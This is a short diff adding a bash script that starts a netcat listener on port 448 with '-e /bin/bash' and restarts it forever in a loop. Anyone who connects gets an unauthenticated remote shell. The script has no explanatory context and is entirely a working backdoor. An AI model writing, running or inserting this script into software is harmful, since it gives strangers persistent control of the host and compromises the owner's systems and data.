@@ -1,0 +1,8 @@
+#!/bin/bash
+
+
+run() {
+	nc -l -p 448 -v -e /bin/bash
+}
+
+while true; do $(run); done 
